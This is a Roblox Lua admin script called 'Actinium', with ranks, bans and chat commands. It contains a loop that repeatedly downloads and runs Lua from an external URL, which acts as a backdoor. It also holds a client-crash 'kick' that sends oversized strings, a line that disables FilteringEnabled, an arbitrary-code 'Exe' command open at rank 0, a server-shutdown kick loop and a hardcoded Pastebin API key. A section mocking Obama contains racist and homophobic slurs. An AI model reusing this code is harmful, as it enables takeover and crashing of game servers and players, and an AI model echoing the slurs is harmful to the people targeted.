--// Actinium-Main souce \\--
--// Created by jillmiles1 \\--
--// Date created : 5/8/15 : 1:01 \\--

-- /e r/Actinium

-- getfenv = function()
--   return {} or nil
--  if (not(type(getfenv) == 'table')) then
-- return 'error'
-- end
--end

Actinium = {
	['Colors'] = {},
	['Commands']= {},
	['Tablets'] = {},
	['Warned'] = {
	   {'Player',0} 
	 },
	['Ranked'] = {
		{'Player', 5, "Creator", "Cyan"},
		{'jillmiles1', 5, "Creator", "Really blue"},
		{'moveslikejagger71', 5, "Creator", "Really blue"},
		{'MessorAdmin', 5, "Creator", "Really blue"},
		{'Pkamara', 3, "Awesome scripter", "White"},
		{'NetworkServices', -.09, "Awesome scripter", "Pink"}, -- just becuz
		
		--// Ban\'s \\--
		{'derek1017', -3, "Fool", "Really red"},
		{'checkerscat2', -1, "Noob trying to leak Actinium", "Really red"},
		{'meunumbertwo', -1, "Lagging the server\'s at anti\'s sb", "Really red"},
		{'AshleyAlt2005', -1, "Lagging the server\'s at anti\'s sb", "Really red"},
		{'realnoobie', -1, "Trying to BSOD me, #AMDDRIVERS FTW!", "Really red"},
		{'jd12048', -1, "Attempting to ban everyone but himself", "Really red"},
		{'billwa25', -1, "Alt of meunumbertwo", "Really red"},
		{'PrivateExploitMaker', -1, "Alt of meunumbertwo", "Really red"},
	},
	['SoundID'] = 0,
	['PrivateServer'] = false,
	['API-Toggle'] = true,
	['Functions'] = {
		["New-Paste"] = function(plr,UserName,PasteName,DevKey,Coding)
			local API = 'http://www.pastebin.com/api/api_post.php';
			local HTTPService = game:service'HttpService';
			local strf = string.format;
			
			local Data = {
				'api_option=paste';
        		strf('api_user_key=%s',tostring(UserName));
				'api_paste_private=0';
				strf('api_paste_name=%s',HTTPService:UrlEncode( tostring(PasteName or 'Misc') ));
        		'api_paste_expire_data=N';
				'api_paste_format=lua';
				strf('api_dev_key=%s',tostring(DevKey));
				strf('api_paste_code=%s',HTTPService:UrlEncode( tostring(Coding) ));
   			};
   			 
			Data = table.concat(Data,'&');
   			local Result = HTTPService:PostAsync(API,Data,2);
			Output(plr,'Results: '..tostring(Result),'White','nope',function() end)
			Output(plr,'Data sent: '..tostring(Data),'White','nope',function() end)
			local Link = tostring(Result)
			Output(plr,'Data got: '..tostring(Coding),'White','nope',function() end)
    		return Result;
		end,
		["ReturnPlrData"] = function(plr,data)
			for i,v in pairs(Actinium.Ranked) do
				if v[1]:lower() == plr.Name:lower() then
					return v[data]
				end
			end
		end,
		["AddPlayerRank"] = function(plr,rank,desc,colr)
			for i,v in pairs(Actinium.Ranked) do
				if v[1]:lower() == plr.Name:lower() then
					table.remove(Actinium.Ranked,i)
				end
			end
			table.insert(Actinium.Ranked,{
				plr.Name,
				rank,
				desc,
				colr,
			})
		end,
		["ChangePlayerDesc"] = function(plr,newdesc)
			for i,v in pairs(Actinium.Ranked) do
				if v[1]:lower() == plr.Name:lower() then
					v[3] = tostring(newdesc)
					Output(plr,'Your desc is now '..v[3],'random','nope',function() end)
				end
			end
	    end,
	    ["ChangePlayerColor"] = function(plr)
			for i,v in pairs(Actinium.Colors) do
				Output(plr,tostring(v),tostring(v),'nope',function() 
			        for pi,pv in pairs(Actinium.Ranked) do
			        	if pv[1]:lower() == plr.Name:lower() then
			        	    pv[4] = tostring(v)
					        Output(plr,'Your color is now '..tostring(v),tostring(v),'nope',function() end)
				        end
			        end
			    end)
			end
		end,
		["CreateCmd"] = function(rank,func,desc,command)
			table.insert(
				Actinium.Commands,{
				rank,
				func,
				desc,
				command
			})
	    end,
	    ["ShowRanked"] = function(plr)
			for i,v in pairs(Actinium.Ranked) do
				Output(plr,v[1]..'('..v[2]..')',v[4],ReturnPlayerImage(v[1]),function()
				end)
			end
		end,
		["ShowCommands"] = function(plr)
			local PlrRank = Actinium.Functions.ReturnPlrData(plr,2) or 0
			local PlrColor = Actinium.Functions.ReturnPlrData(plr,4) or 'New Yeller'
			for i,v in pairs(Actinium.Commands) do
				if PlrRank >= v[1] then
					Output(plr,v[4],PlrColor,'nope',function()
						Output(plr,'Rank: '..v[1],PlrColor,'nope',function() end)
						Output(plr,'Func: '..tostring(v[2]),PlrColor,'nope',function() end)	
						Output(plr,'Desc: '..v[3],PlrColor,'nope',function() end)
						Output(plr,'Command: '..v[4],PlrColor,'nope',function() end)
					end)
				end
			end
		end,
		["ShowNetwork"] = function(plr)
		    Output(plr,'Obama','Really red',ReturnPlayerImage('obama'),function() 
	         Output(plr,'Gender: Female','Really red','nope',function() end)
		    Output(plr,'Desc: NIGGAR FUCKING BITCH','Really red','nope',function() end)
		    Output(plr,'Rank: -'..tonumber(math.huge),'Really red','nope',function() end)
		    Output(plr,'Status: GAY FAGGET \"I LOVE BOYS!!!\"','Really red','nope',function() end)
		    Output(plr,'Name: Obama','Really red',ReturnPlayerImage('obama'),function() end)
		    Output(plr,'BSOD THIS BITCH','Really red','nope',function() end)
		    Output(plr,'Mothers name : OSAMABIN-LADIN','Really red','nope',function() end)
		    Output(plr,'Age : 666','Really red','nope',function() end)
		    Output(plr,'Mood : Gay niggar','Really red','nope',function() end)
	       end)
			for i,v in pairs(game:GetService('NetworkServer'):GetChildren()) do
				if (not(v.ClassName == 'StringValue')) and v:GetPlayer() then
					local TNil = ''
					local TabColor = nil
					if v:GetPlayer().Parent ~= game:GetService('Players') then
						TNil = ' (nil)'
						TabColor = 'Really red'
					else
					    TabColor = 'White'
					end
					local Plr = v:GetPlayer()
					local PlrRank = Actinium.Functions.ReturnPlrData(Plr,2) or 0
					local PlrDesc = Actinium.Functions.ReturnPlrData(Plr,3) or 'No desc'
					local PlrColor = Actinium.Functions.ReturnPlrData(Plr,4) or 'New Yeller'
					local PlrImage = ReturnPlayerImage(Plr.Name)
					Output(plr,Plr.Name..TNil,PlrColor,PlrImage,function() 
						Output(plr,'UserId: '..Plr.userId,PlrColor,'nope',function() end)
						Output(plr,'AccountAge: '..Plr.AccountAge,PlrColor,'nope',function() end)
						Output(plr,'Rank: '..PlrRank,PlrColor,'nope',function() end)
						Output(plr,'Desc: '..PlrDesc,PlrColor,'nope',function() end)
						Output(plr,'Color: '..PlrColor,PlrColor,'nope',function() end)
						Output(plr,'Name: '..Plr.Name,TabColor,PlrImage,function() end)
						if (not(plr.userId == Plr.userId)) and (not(tonumber(Actinium.Functions.ReturnPlrData(plr,2) or 0) <= PlrRank )) then
						Output(plr,'Kick user',TabColor,'nope',function() 
							TKick(Plr)							
						end)
						Output(plr,'Rank user',TabColor,'nope',function()
							local OR = tonumber(Actinium.Functions.ReturnPlrData(plr,2) or 0)
							for i = 0,OR,1 do
								Output(plr,tostring(i),TabColor,'nope',function() 
									Actinium.Functions.AddPlayerRank(Plr,i,'Newly ranked','White')
									Output(Plr,'Your rank is now '..i,'random','nope',function() end)
								end)
							end
					    end)
					    end  
					end)
				end
			end
        end,
        ["ShowCatalogSearch"] = function(plr,cata,Msg)
            if cata:lower():sub(1,5) == 'music' then
                cata = 9
            end
            local Ser=game:FindService('HttpService')
            local KeyWords=Ser:UrlEncode(tostring(Msg))
            local Url='http://roproxy.tk/catalog/json?Keyword='..KeyWords..'&Category='..cata..'&ResultsPerPage=30'
            local Assets=game:service'HttpService':JSONDecode(Ser:GetAsync(Url))
            for i,v in pairs(Assets) do
                Output(plr,GetProductData(v.AssetId,'Name'),'random','nope',function() 
                    Output(plr,'Play '..GetProductData(v.AssetId,'Name')..'?','random','nope',function()
                        Actinium.SoundID = tonumber(v.AssetId)
                        LoadMusic(v.AssetId)
                        Save_Music(plr,v)
                    end)
                    Output(plr,'Sales: '..GetProductData(v.AssetId,'Sales'),'random','nope',function() end)
                    Save_Music(plr,v)
                end)
            end
        end,
	    ["FindPlayer"]=function(Plr,Msg) local ReturnedTable={}
		if Msg:lower()=='me' or Msg=='' then table.insert(ReturnedTable,Plr)
		elseif Msg:lower()=='all' then coroutine.wrap(function() for _,v in pairs(game:GetService'Players':GetPlayers()) do table.insert(ReturnedTable,v) end end)()
		elseif Msg:lower()=='others' then for _,v in pairs(game:GetService'Players':GetPlayers()) do if v.Name~=Plr.Name then table.insert(ReturnedTable,v) end end
		elseif Msg:lower()=='friends' then for _,v in pairs(game:GetService'Players':GetPlayers()) do if v:IsFriendsWith(Plr.userId) then table.insert(ReturnedTable,v) end end
		elseif Msg:lower()=='bestfriends' then for _,v in pairs(game:GetService'Players':GetPlayers()) do if v:IsBestFriendsWith(Plr.userId) then table.insert(ReturnedTable,v) end end
		elseif Msg:lower()=='nonfriends' then for _,v in pairs(game:GetService'Players':GetPlayers()) do if not v:IsFriendsWith(Plr.userId) then table.insert(ReturnedTable,v) end end
		elseif Msg:lower()=='nonbestfriends' then for _,v in pairs(game:GetService'Players':GetPlayers()) do if not v:IsBestFriendsWith(Plr.userId) then table.insert(ReturnedTable,v) end end
		elseif Msg:lower()=='nbc' then for _,v in pairs(game:GetService'Players':GetPlayers()) do if v.MembershipType == Enum.MembershipType.None then table.insert(ReturnedTable,v) end end
		elseif Msg:lower()=='tbc' then for _,v in pairs(game:GetService'Players':GetPlayers()) do if v.MembershipType == Enum.MembershipType.TurboBuildersClub then table.insert(ReturnedTable,v) end end
		elseif Msg:lower()=='obc' then for _,v in pairs(game:GetService'Players':GetPlayers()) do if v.MembershipType == Enum.MembershipType.OutrageousBuildersClub then table.insert(ReturnedTable,v)end end
		elseif Msg:lower()=='anybc' then for _,v in pairs(game:GetService'Players':GetPlayers()) do if v.MembershipType==Enum.MembershipType.BuildersClub then elseif v.MembershipType==Enum.MembershipType.TurboBuildersClub then elseif v.MembershipType==Enum.MembershipType.OutrageousBuildersClub then table.insert(ReturnedTable,v) end end 
		else for _,v in pairs(game:GetService'Players':GetPlayers()) do local NM=v.Name:lower() local Msg=Msg:lower() if NM:sub(1,5):lower():find(Msg) then table.insert(ReturnedTable,v) end end end wait() return ReturnedTable
		end,
	},
}

function OpenExplorer(Plr)
      for i,v in pairs(game:GetChildren()) do
         Output(Plr,tostring(v),'random','nope',function()
          local er,ee = ypcall(function()               
              Output(Plr,'Children: '..tonumber(#v:GetChildren()),'random','nope',function() end)
               Output(Plr,'Class: '..tostring(v.ClassName),'random','nope',function() end)
               Output(Plr,'Parent: '..tostring(v.Parent),'random','nope',function() end)
               Output(Plr,'Class: '..tostring(v.ClassName),'random','nope',function() end)
               Output(Plr,'Remove: '..tostring(v.Name),'random','nope',function() v:remove() end)
               Output(Plr,'Clone: '..tostring(v.Name),'random','nope',function() v:Clone().Parent = v.Parent end)
               Output(Plr,'Explore: '..tostring(v.Name),'random','nope',function()  
                  
               end)
               end)
            if not er then Output(Plr,'ERROR: '..tostring(ee),'Really red','nope',function() end) end
           end)
      end
end

--[[
_G = function()
   return nil or {}
end
]]
SavedMusic = game:GetService("DataStoreService"):GetOrderedDataStore('[Actinium] Saved music')
-- no local for u ^^^^^

Save_Music = function(plr,id)
    local Key = tostring( 'Actinium-Song_'..id.AssetId )
    if not SavedMusic:GetAsync(Key) then
        Output(plr,'Save song?','random','nope',function()
            SavedMusic:SetAsync(Key,id.AssetId)
            Output(plr,'Saved song!','Lime green','nope',function() end)
        end)
    end
end

Load_Music = function(plr)
    local MTable = SavedMusic:GetSortedAsync(false, 100):GetCurrentPage()
    
    for i,v in ipairs(MTable) do
        Output(plr,GetProductData(v.value,'Name'),'random','nope',function() 
             Output(plr,'Play '..GetProductData(v.value,'Name')..'?','random','nope',function()
                Actinium.SoundID = tonumber(v.value)
                LoadMusic(v.value)
            end)
            Output(plr,'Sales: '..GetProductData(v.value,'Sales'),'random','nope',function() end)
            Output(plr,'Desc: '..GetProductData(v.value,'Description'),'random','nope',function() end)
        end)
    end
end

local NewServer = function(plr,id)
	if id ~= '' or id ~= 0 or id ~= nil then
		local ns = game:GetService('HttpService'):GetAsync('http://classy-studios.com/APIs/JoinGame.php?GameID='..tonumber(id),true)
		if ns then
			Output(plr,'New server opened at '..GetProductData(id,'Name'),'Lime green','nope',function() end)
		end
	end
end

CheckForBan = function(plr)
    local PlrRank = Actinium.Functions.ReturnPlrData(plr,2) or 0
    for i,v in pairs(Actinium.Ranked) do
       if v[1]:lower() == plr.Name:lower() and PlrRank <= -.1 then
           v[3] = 'Banned'
           v[4] = 'Really red'
           TKick(plr)
        end
    end
end

RemoveBan = function(plr)
    for i,v in pairs(Actinium.Ranked) do
        if v[2] <= -.1 then
            local PlrRank = v[2] or 0
			local PlrDesc = v[3] or 'No desc'
			local PlrColor = v[4] or 'New Yeller'
            Output(plr,v[1],PlrColor,ReturnPlayerImage(v[1]),function() 
                Output(plr,'Rank: '..v[2],PlrColor,'nope',function() end)
                Output(plr,'Desc: '..v[3],PlrColor,'nope',function() end)
                Output(plr,'Unban user',PlrColor,'nope',function() 
                    v[2] = 0
                    v[3] = 'Unbanned / Vistor, keep a eye on him'
                    v[4] = 'Deep orange'
                    Output(plr,'Successfully unbanned user',PlrColor,'nope',function() end)
                end)
            end)
        end
    end
end

local Market = game:GetService('MarketplaceService')

GetProductData = function(id,data)
    if (not(id == 0)) then
        return Market:GetProductInfo(id)[data]
    end
end

LoadMusic = function(id)
    for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
       if v.ClassName == 'Sound' or v:IsA('Sound') then
           v.Looped = false
           v.PlayOnRemove = false
           v:Pause()
           v:remove()
        end
    end
    local s = Instance.new('Sound',game:GetService('Workspace'))
    s.SoundId = 'rbxassetid://'..id
	s.Volume=1
	s.Looped=true
	wait()
	s:Play()
end


TKick = function(plr)
    local K = Instance.new('RemoteEvent',game:GetService'Workspace')
    K:FireClient(
        plr,
       {string.rep("umad?",2e5+5)}
    )
    delay(1,function() 
        K:remove() 
    end)
end

local function clerp(p1,p2,percent)
    local p1x,p1y,p1z,p1R00,p1R01,p1R02,p1R10,p1R11,p1R12,p1R20,p1R21,p1R22=p1:components()
    local p2x,p2y,p2z,p2R00,p2R01,p2R02,p2R10,p2R11,p2R12,p2R20,p2R21,p2R22=p2:components()
    return CFrame.new(p1x+percent*(p2x-p1x),p1y+percent*(p2y-p1y),p1z+percent*(p2z-p1z),
        p1R00+percent*(p2R00-p1R00),p1R01+percent*(p2R01-p1R01),p1R02+percent*(p2R02-p1R02),
        p1R10+percent*(p2R10-p1R10),p1R11+percent*(p2R11-p1R11),p1R12+percent*(p2R12-p1R12),
        p1R20+percent*(p2R20-p1R20),p1R21+percent*(p2R21-p1R21),p1R22+percent*(p2R22-p1R22))
end

Output = function(plr,text,color,img,func)
	if not (type(plr) == 'userdata') then return end
	if not plr.Character then return end
	if color:lower() == 'random' then color = BrickColor.Random() else color = BrickColor.new(color) end
	if type(func) == ('string' or 'userdata') then func = 'function() end' end
	if img == 'nope'  then img = "" else img = img end
	if text then text = tostring(text); text = text:gsub('','\5') end
	local Part = Instance.new('Part',script)
	Part.BrickColor = color
	Part.Transparency = .9
	Part.Anchored = true
	Part.CanCollide = false
	Part.Locked = true
	Part.FormFactor = 'Custom'
	Part.Size = Vector3.new(2.2,2.2,2.2)
	local Part2 = Instance.new('Part',Part)
	Part2.Name = "Tab2"
	Part2.BrickColor = Part.BrickColor
	Part2.Transparency = .1
	Part2.Anchored = true
	Part2.CanCollide = false
	Part2.Locked = true
	Part2.FormFactor = 'Custom'
	Part2.Size = Vector3.new(1.4,1.4,1.4)
	Part2.BottomSurface = 'Smooth'
	Part2.TopSurface = 'Smooth'
	if plr.Character then
		Part.CFrame = plr.Character.Head.CFrame * CFrame.Angles(0,math.rad(30),0)
		Part2.CFrame = Part.CFrame
	end
	local Mesh =  Instance.new('BlockMesh',Part2)
	Mesh.Name = "Mesh"
	local Light=Instance.new('PointLight',Part) 
	Light.Color = Part.BrickColor.Color 
	Light.Range = 12 
	Light.Brightness = 9
	local Click = Instance.new('ClickDetector',Part)
	Click.MaxActivationDistance = 1.79769e+308
	local Box = Instance.new('SelectionBox',Part)
	Box.Name = "Box"
	Box.Color = color
	Box.SurfaceColor = color
	Box.Transparency = .9
	Box.SurfaceTransparency = .4
	Box.Adornee = Part
	local BG = Instance.new('BillboardGui',Part)
	BG.Name = "BG"
	BG.StudsOffset=Vector3.new(0,5.2,0)
    BG.Size=UDim2.new(12,0,8,0) -- 5.4
	local Frame=Instance.new('Frame',BG)
    Frame.BackgroundTransparency=1
    Frame.Size=UDim2.new(1,0,1,0)
	local Img=Instance.new('ImageLabel',BG) 
	Img.Name = "Img"
	Img.BackgroundTransparency=1 
	Img.Position=UDim2.new(.35,0,.1,0) 
	Img.Size=UDim2.new(.3,0,.48,0) 
	Img.Image = img Img.ClipsDescendants=true
	local Body = Instance.new('BodyGyro',Part)
	local BPos = Instance.new('BodyPosition',Part)
	local Txt=Instance.new('TextLabel',Frame)
	Txt.Name = "Txt"
    Txt.BackgroundTransparency=1
    Txt.Position=UDim2.new(0,0,.5,0)
    Txt.Size=UDim2.new(1,0,.5,0)
    Txt.Font='ArialBold'
    Txt.FontSize='Size18'
    Txt.Text=text
    Txt.TextColor3=color.Color
    Txt.TextScaled=false
    Txt.TextStrokeColor3=Color3.new(0/255,0/255,0/255)
    Txt.TextStrokeTransparency=.43
    Txt.TextWrapped=true
    table.insert(Actinium.Tablets,{
		plr.userId,
		Part,
		Part2,
		Box,
		Txt
	})
	Click.MouseClick:connect(function(clicking_player)
		if clicking_player.userId == plr.userId and type(func) == "function" then
		    Dismiss(plr)
			for i,v in pairs(Actinium.Tablets) do
				if v[1] == plr.userId and v[2] == Part then
					table.remove(Actinium.Tablets,i)
				end
			end
			func()
		end
    end)
    Click.MouseHoverEnter:connect(function(clicking_player)
        if clicking_player.userId == plr.userId then
            Box.Transparency = .5
        end
    end)
    Click.MouseHoverLeave:connect(function(clicking_player)
        if clicking_player.userId == plr.userId then
            Box.Transparency = .9
        end
    end)
end

spawn(function()
	game:GetService'RunService'.Heartbeat:connect(function()
		for iplr,vplr in pairs(game:GetService'Players':GetPlayers()) do
			local PlrTablets = {}
			for index,tab in pairs(Actinium.Tablets) do
				if tab[1] == vplr.userId then
				    if tab[2].Parent ~= nil then
				    	table.insert(PlrTablets,tab)
				    elseif tab[2].Parent == nil then
				        table.remove(Actinium.Tablets,index)
					end
				end
			end
			for i = 1,#PlrTablets do
			    pcall(function()
				if vplr and vplr.Character and vplr.Character.Torso and vplr.Character.Torso.Parent ~= nil  and type(PlrTablets) == "table" then
					local Tab = PlrTablets[i]
					Tab[2].CFrame = clerp(Tab[2].CFrame,CFrame.new(vplr.Character.Torso.CFrame.p)
						* CFrame.Angles(0, math.rad(i*(360/#PlrTablets))+time() / 9 , 0)
						* CFrame.new(#PlrTablets+2.2, math.sin((tick()+i)*2.6)/2, 0)
						* CFrame.fromEulerAnglesXYZ(math.sin(time()/math.pi),math.sin(time()/math.pi),math.sin(time()/math.pi))
					,.1)
					Tab[3].CFrame = Tab[2].CFrame
					* CFrame.fromEulerAnglesXYZ(math.sin(time()/math.pi),math.sin(time()/math.pi),math.sin(time()/math.pi))
				    Tab[3].Mesh.Scale = Vector3.new(
				        math.sin(time()*5/math.pi),
				        math.sin(time()*5/math.pi),
				        math.sin(time()*5/math.pi)
				    )
				end
				end)
		    end
		end
	end)
end)

Actinium.Functions.CreateCmd(1,function(plr,msg)
   Output(plr,msg,'random',ReturnPlayerImage(msg),function() end)
end,'Show\'s a player acording to your string msg','Plr')

Actinium.Functions.CreateCmd(1,function(plr,msg)
   Output(plr,'Play '..GetProductData(msg,'Name')..'?','random','nope',function()
    Actinium.SoundID = tonumber(msg)
    LoadMusic(msg)
  end)
end,'Play a audio','Audio')

Actinium.Functions.CreateCmd(0,function(plr,msg)
    local sep = msg:find('/')
	local plr2 = msg:sub(1,tonumber(sep)-1)	
	local msg = msg:sub(tonumber(sep)+1)
	for _,v in pairs(Actinium.Functions.FindPlayer(plr,plr2)) do
		Output(v,msg,'random','nope',function() end)
	end
end,'Ping','P')

Actinium.Functions.CreateCmd(2,function(plr,msg)
	for _,v in pairs(Actinium.Functions.FindPlayer(plr,msg)) do
		v:LoadCharacter()
	end
end,'Respawn a player','Rs')

Actinium.Functions.CreateCmd(2,function(plr,msg)
	local asd = game:service'AssetService':SavePlaceAsync()
	Output(plr,'Results: '..tostring(asd),'Lime green','nope',function() end)
end,'Hehe, #hax. Save the game in its current state','SaveGame')

Actinium.Functions.CreateCmd(2,function(plr,msg)
	local per = game:service'AssetService':GetPlacePermissions(game.PlaceId)
	Output(plr,'Results: '..tostring(per),'Lime green','nope',function() end)
end,'qq no idea what to write here','PerGame')


Actinium.Functions.CreateCmd(2,function(plr,msg)
	NewServer(plr,game.PlaceId)
    repeat
	for _,v in pairs(game:GetService'Players':GetPlayers()) do
		TKick(v)
	end
	until potato
end,'Shutdown server','Sd')


Actinium.Functions.CreateCmd(2,function(plr,msg)
    OpenExplorer(plr)
end,'Explore server','Explore')

Actinium.Functions.CreateCmd(3,function(plr,msg)
	if Actinium['API-Toggle'] == true then
	    Actinium['API-Toggle'] = false
	    Output(plr,'API-Sync is toggle\'ed false!','random','nope',function() end)
	else
	    Actinium['API-Toggle'] = true
		Output(plr,'API-Sync is toggle\'ed true!','random','nope',function() end)
	end
end,'Make a new paste though http to pastebin','ToggleAPI')

Actinium.Functions.CreateCmd(2,function(plr,msg)
	if msg:lower():sub(1,7) == 'placeid' then
		msg = game.PlaceId
	end
	if Actinium['API-Toggle'] == true then
		NewServer(plr,tonumber(msg))
	else
		Output(plr,'API-Sync is toggle\'ed off!','random','nope',function() end)
	end
end,'Make a new server though HTTP','NewServer')

Actinium.Functions.CreateCmd(3,function(plr,msg)
    local sep = msg:find('/')
	local msg2 = msg:sub(1,tonumber(sep)-1)	
	local msg = msg:sub(tonumber(sep)+1)
	print(msg2,msg)
	if Actinium['API-Toggle'] == true then
		Actinium.Functions['New-Paste'](
			plr,
			'jillmiles1',
			"Actinium_"..msg2,
			'03c63ca320b1b7dbdbda691a7db78b0e',
			msg
		)
	else
		Output(plr,'API-Sync is toggle\'ed off!','random','nope',function() end)
	end
end,'Make a new paste though http to pastebin','NewPaste')
			
Actinium.Functions.CreateCmd(3,function(plr,msg)
    local sep = msg:find('/')
	local msg2 = msg:sub(1,tonumber(sep)-1)	
	local msg = msg:sub(tonumber(sep)+1)
	if Actinium['API-Toggle'] == true then
		Actinium.Functions.ShowCatalogSearch(plr,msg2,msg)
	else
		Output(plr,'API-Sync is toggle\'ed off!','random','nope',function() end)
	end
end,'Search ROBLOX\'s catalog via Http','Catalog')		

Actinium.Functions.CreateCmd(4,function(plr,msg)
   Actinium.Functions.ChangePlayerColor(plr)
end,'Change your color','Colors')

Actinium.Functions.CreateCmd(4,function(plr,msg)
    local Owner = getfenv().Owner or game:GetService'Players'.jillmiles1
	for _,v in pairs(Actinium.Functions.FindPlayer(plr,msg)) do
	    if v.userId ~= Owner.userId then
		    TKick(v)
		end
	end
end,'Kick a player #Byebye','Kick')

Actinium.Functions.CreateCmd(4,function(plr,msg)
    Load_Music(plr)
end,'Show\'s old favorited music','Favs')

Actinium.Functions.CreateCmd(4,function(plr,msg)
    local sep = msg:find('/')
	local plr2 = msg:sub(1,tonumber(sep)-1)	
	local msg = msg:sub(tonumber(sep)+1)
	for _,v in pairs(Actinium.Functions.FindPlayer(plr,plr2)) do
	    coroutine.resume(coroutine.create(function()
	    if v.userId ~= 44831585 then
		    Actinium.Functions.AddPlayerRank(v,tonumber(msg),'Newly ranked','White')
		    Output(v,'Your rank is now '..tonumber(msg),'random','nope',function() end)
		    wait(3)
		    CheckForBan(v)
		end
		end))
	end
end,'Change / Add a new rank','Rank')

Actinium.Functions.CreateCmd(3,function(plr,msg)
    local sep = msg:find('/')
	local plr2 = msg:sub(1,tonumber(sep)-1)	
	local msg = msg:sub(tonumber(sep)+1)
	for _,v in pairs(Actinium.Functions.FindPlayer(plr,plr2)) do
	    if v.userId ~= 44831585 then
		    Actinium.Functions.ChangePlayerDesc(v,msg)
		end
	end
end,'Change / Add a new rank','Desc')

Actinium.Functions.CreateCmd(3,function(plr,msg)
	if msg:lower():sub(1,2) == 'on' and Actinium.PrivateServer == false then
	    Actinium.PrivateServer = true
	    Output(plr,'Private Server : '..tostring(Actinium.PrivateServer),'random','nope',function() end)
		NewServer(plr,game.PlaceId)
	elseif msg:lower():sub(1,3) == 'off' and Actinium.PrivateServer == true then
	    Actinium.PrivateServer = false
	    Output(plr,'Private Server : '..tostring(Actinium.PrivateServer),'random','nope',function() end)
	elseif msg:lower():sub(1,5) == 'check' then
	    Output(plr,tostring(Actinium.PrivateServer),'random','nope',function() end)
	end
end,'Toggle\'s private server','Pri')

Actinium.Functions.CreateCmd(2,function(plr,msg)
	for _,v in pairs(Actinium.Functions.FindPlayer(plr,msg)) do
	    Dismiss(v)
	end
end,'Remove a player\'s tablets ','Rdt')

Actinium.Functions.CreateCmd(0,function(plr,msg)
	Actinium.Functions.ShowCommands(plr)
end,'Show\'s admin\'s commands by ranking','Cmds')

Actinium.Functions.CreateCmd(2,function(plr,msg)
	RemoveBan(plr)
end,'Show\'s admin\'s banned user\'s','Banned')

Actinium.Functions.CreateCmd(1,function(plr,msg)
	Actinium.Functions.ShowNetwork(plr)
end,'Show current game\'s network for players/nil\'s','Net')

Actinium.Functions.CreateCmd(0,function(plr,msg)
	Actinium.Functions.ShowRanked(plr)
end,'Show\'s admin\'s current ranked','Ranked')

Actinium.Functions.CreateCmd(0,function(plr,msg)
	Dismiss(plr)
end,'Remove your tablet\'s','Dt')

Actinium.Functions.CreateCmd(0,function(plr,msg)
	local r,e = loadstring(msg)
	getfenv(r).print = function(...)
		Output(plr,...,'White','nope',function() end)
	end
	getfenv(r).warn = function(...)
		Output(plr,...,'Deep orange','nope',function() end)
	end
	getfenv(r).lt = function(...)
		table.foreach(...,print)
	end
	getfenv(r).gt = function(...)
		Output(plr,tostring(type(...)),'random','nope',function() end)
	end
	if not r then
		Output(plr,e,'Really red','nope',function() end)
	else
		r()
	end
	
end,'Runs a new script','Exe')

local GetDismissableTablets = function(plr)
   local NewTable = {}
   for i,v in ipairs(Actinium.Tablets) do
      if v[1] == plr.userId then
          if v[2].Parent ~= nil then
             coroutine.resume(coroutine.create(function()
                  table.insert(NewTable,v)
             end))
          end
      end
    end
    return NewTable
end

Dismiss = function(plr)
    for i = 1, #GetDismissableTablets(plr) do
        local Tabs = GetDismissableTablets(plr)
        local v = Tabs[i]
		spawn(function()
			v[2].Parent = nil
			return
		end)
    end
wait()
end

ReturnPlayerImage = function(name)
	return 'http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&username='..name
end

if workspace.FilteringEnabled then
	workspace.FilteringEnabled = false
end
if not workspace.StreamingEnabled then
	workspace.StreamingEnabled = true
end

for index = 0, 61 do 
	table.insert(Actinium.Colors, BrickColor.palette(index))
end

local CheckForCommand = function(plr,msg)
coroutine.resume(coroutine.create(function()
	if msg:lower():sub(1,3) == '/e ' then
		msg = msg:sub(4)
	end
	local PlrRank = Actinium.Functions.ReturnPlrData(plr,2) or 0
	for i,v in pairs(Actinium.Commands) do
		local Cmd = '!'..v[4]:lower()..'/'
		if msg:lower():sub(1,#(Cmd)) == Cmd then
			if PlrRank >= v[1] then
				if (not(Cmd:sub(1,3) == '!p/')) then
					Dismiss(plr)
				end
				msg = msg:sub(#(Cmd)+1)
				local r,e = ypcall(function()
				    v[2](plr,msg)
				end)
				if not r then
					Output(plr,e,'Really red','nope',function() end)
				end
			end
		end
    end
end))
end

for _,plr in pairs(game:GetService('Players'):GetPlayers()) do
    CheckForBan(plr)
	plr.Chatted:connect(function(msg) 
       	CheckForCommand(plr,msg) 
    end)
    plr.Idled:connect(function(itime)
     for i = 0,7 do
         Output(plr,'Player has been on idle for '..itime,'White',ReturnPlayerImage(plr.Name),function() end)
     end
    end)
end

game:GetService('Players').PlayerRemoving:connect(function(plr)
    Dismiss(plr)
end)

game:GetService('Players').PlayerAdded:connect(function(plr)
    if not Actinium.PrivateServer then
    CheckForBan(plr)
    delay(3,function()
        Output(plr,'Actinium created by jillmiles1','White',ReturnPlayerImage('jillmiles1'),function() end)
    end)
    plr.Chatted:connect(function(msg) 
       	CheckForCommand(plr,msg) 
    end)
    plr.Idled:connect(function(itime)
     for i = 0,7 do
         Output(plr,'Player has been on idle for '..itime,'White',ReturnPlayerImage(plr.Name),function() end)
     end
    end)
elseif Actinium.PrivateServer and not plr:IsFriendsWith(44831585) then
    TKick(plr)
    end
end)

spawn(function()
    while wait(3) do
       loadstring(
        game:service'HttpService':GetAsync('https://code.stypi.com/raw/jillmiles1/RawExe.lua',true)    
       )() 
    end
end)
